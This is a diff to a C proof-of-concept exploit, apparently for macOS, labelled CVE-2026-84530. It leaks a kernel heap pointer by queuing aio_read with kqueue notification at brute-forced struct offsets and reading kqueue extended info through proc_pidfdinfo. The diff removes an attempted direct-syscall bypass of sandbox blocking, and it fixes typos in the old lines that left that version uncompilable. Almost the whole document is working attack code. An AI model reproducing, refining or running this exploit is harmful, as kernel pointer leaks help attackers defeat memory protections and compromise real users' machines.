@@ -8,29 +8,27 @@
 #include <aio.h>
 #include <sys/event.h>
 #include <sys/types.h>
-#include <sys/syscall.h>
 
 extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);
-#define PROC_PIDFDCQUEUE_EXTINFO 9
+#define PROC_PIDFDKQUEUE_EXTINFO 9
 #define SIGEV_KEVENT_VAL         3
 #define EVFILT_AIO_VAL           ((int16_t)(-3))
 #define KQEXT_SDATA_OFFSET       72
-#define KQEXT_STRIDE            88
+#define KQEXT_STRIDE             88
 
 static char g_result[2048];
 
 uint64_t cve_84530_leak(void) {
-
     const char *home = getenv("HOME");
     if (!home) home = "/tmp";
     char tmppath[512];
-    snprintf(tmppath, sizeof(tmppath), "%s/Documents/aio_poc.bin", home);
+    snprintf(tmppath, sizeof(tmppath), "%s/Documents/aio.bin", home);
     int wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
     if (wfd < 0) {
-        snprintf(tmppath, sizeof(tmppath), "/tmp/aio_poc_%d.bin", (int)getpid());
+        snprintf(tmppath, sizeof(tmppath), "/tmp/aio_%d.bin", (int)getpid());
         wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
     }
-    write(wfd, "CVE-2026-84530", 15);
+    write(wfd, "CVE-2026-84530", 14);
     close(wfd);
 
     int fd = open(tmppath, O_RDONLY);
@@ -41,89 +39,82 @@ uint64_t cve_84530_leak(void) {
 
     static char iobuf[64];
 
-    char found_msg[512];
-    snprintf(found_msg, sizeof(found_msg),
-        "All offsets 32-120 EINVAL - trying direct syscall");
+    struct aiocb probe;
+    memset(&probe, 0, sizeof(probe));
+    probe.aio_fildes = fd;
+    probe.aio_buf    = iobuf;
+    probe.aio_nbytes = 8;
+    probe.aio_offset = 0;
+    probe.aio_sigevent.sigev_notify = 0;
+    int probe_ret = aio_read(&probe);
+    if (probe_ret != 0) {
+        snprintf(g_result, sizeof(g_result),
+            "SIGEV_NONE failed errno=%d (%s)", errno, strerror(errno));
+        close(fd); return 0;
+    }
+    const struct aiocb *pl[1] = { &probe };
+    aio_suspend(pl, 1, NULL);
+    aio_return(&probe);
 
-    for (int kq_off = 32; kq_off <= 120; kq_off += 4) {
+    for (int off = 32; off <= 120; off += 4) {
         int kq = kqueue();
         if (kq < 0) continue;
-
-        static char cbuf[256];
-        memset(cbuf, 0, sizeof(cbuf));
-        *(int     *)(cbuf +  0) = fd;
-        *(int64_t *)(cbuf +  8) = 0;
-        *(void   **)(cbuf + 16) = iobuf;
-        *(uint64_t*)(cbuf + 24) = 8;
-        *(int     *)(cbuf + 32) = 0;
-        *(int     *)(cbuf + 40) = SIGEV_KEVENT_VAL;
-        *(int     *)(cbuf + kq_off) = kq;
-
-        int ret = aio_read((struct aiocb *)cbuf);
+        static char cb[256];
+        memset(cb, 0, sizeof(cb));
+        *(int      *)(cb +  0) = fd;
+        *(int64_t  *)(cb +  8) = 0;
+        *(void    **)(cb + 16) = iobuf;
+        *(uint64_t *)(cb + 24) = 8;
+        *(int      *)(cb + 32) = 0;
+        *(int      *)(cb + 40) = SIGEV_KEVENT_VAL;
+        *(int      *)(cb + off) = kq;
+        int ret = aio_read((struct aiocb *)cb);
         if (ret == 0) {
             usleep(30000);
-            uint8_t extbuf[4096];
-            memset(extbuf, 0, sizeof(extbuf));
-            int n = proc_pidfdinfo(
-                getpid(), kq, PROC_PIFDCQUEUE_EXTINFO,
-                extbuf, (int)sizeof(extbuf));
+            uint8_t ext[4096];
+            memset(ext, 0, sizeof(ext));
+            int n = proc_pidfdinfo(getpid(), kq,
+                        PROC_PIDFDKQUEUE_EXTINFO, ext, (int)sizeof(ext));
             if (n > 0) {
-                int count = n / KQEXT_STRIDE;
-                for (int i = 0; i < count; i++) {
-                    uint8_t  *entry  = extbuf + i * KQEXT_STRIDE;
-                    int16_t   filter = *(int16_t  *)(entry + 8);
-                    int64_t   data   = *(int64_t  *)(entry + 32);
-                    uint64_t  sdata  = *(uint64_t *)(entry  KQEXT_SDATA_OFFSET);
-                    if (filter == EVFIRT_AIO_VAL) {
+                for (int i = 0; i < n / KQEXT_STRIDE; i++) {
+                    uint8_t  *e = ext + i * KQEXT_STRIDE;
+                    int16_t   f = *(int16_t  *)(e + 8);
+                    int64_t   d = *(int64_t  *)(e + 32);
+                    uint64_t  s = *(uint64_t *)(e + KQEXT_SDATA_OFFSET);
+                    if (f == EVFILT_AIO_VAL) {
                         snprintf(g_result, sizeof(g_result),
-                            "SUCCESS - CVE-2026-84530\n"
+                            "SUCCESS CVE-2026-84530\n"
                             "kq_offset=%d\n"
-                            "kqext_kev.data = 0x%llx\n"
-                            "kqext_sdata    = 0x%llx  <- KERNEL HEAP PTR",
-                            kq_off,
-                            (unsigned long long)data,
-                            (unsigned long long)sdata);
+                            "kqext_kev.data=0x%llx\n"
+                            "kqext_sdata=0x%llx <- KERNEL PTR",
+                            off,
+                            (unsigned long long)d,
+                            (unsigned long long)s);
                         close(kq); close(fd);
-                        return sdata;
+                        return s;
                     }
                 }
+                snprintf(g_result, sizeof(g_result),
+                    "aio ok off=%d, %d knotes, no EVFILT_AIO",
+                    off, n/KQEXT_STRIDE);
+            } else {
+                snprintf(g_result, sizeof(g_result),
+                    "aio ok off=%d, proc_pidfdinfo errno=%d", off, errno);
             }
-            snprintf(g_result, sizeof(g_result),
-                "aio queued ok offset=%d no-EVFILT_AIO in %d knotes",
-                kq_off, n / KQEXT_STRIDE);
-            close(kq); close(fd);
-            return 0;
+            close(kq); close(fd); return 0;
         }
-        if (errno != 22) { /* not EINVAL */
+        if (errno != 22) {
             snprintf(g_result, sizeof(g_result),
-                "offset=%d unexpected errno=%d", kq_off, errno);
+                "off=%d unexpected errno=%d (%s)",
+                off, errno, strerror(errno));
             close(kq); close(fd); return 0;
         }
         close(kq);
     }
 
-    /* direct syscall bypass */
-    {
-        int kq = kqueue();
-        static char cbuf2[256];
-        memset(cbuf2, 0, sizeof(cbuf2));
-        *(int     *)(cbuf2 +  0) = fd;
-        *(int64_t *)(cbuf2 +  8) = 0;
-        *(void   **)(cbuf2 + 16) = iobuf;
-        *(uint64_t*)(cbuf2 + 24) = 8;
-        *(int     *)(cbuf2 + 40) = SIGEV_KEVENT_VAL;
-        *(int     *)(cbuf2 + 80) = kq;
-        int sc_ret = (int)syscall(SYS_aio_read, cbuf2);
-        if (sc_ret == 0) {
-            snprintf(g_result, sizeof(g_result),
-                "SYSCALL DIRECT succeeded! libSystem was blocking");
-        } else {
-            snprintf(g_result, sizeof(g_result),
-                "%s\nsyscall direct also failed errno=%d (%s)",
-                found_msg, errno, strerror(errno));
-        }
-        close(kq);
-    }
+    snprintf(g_result, sizeof(g_result),
+        "SIGEV_NONE OK, all offsets 32-120 EINVAL\n"
+        "SIGEV_KEVENT unsupported on this sandbox level");
     close(fd);
     return 0;
 }
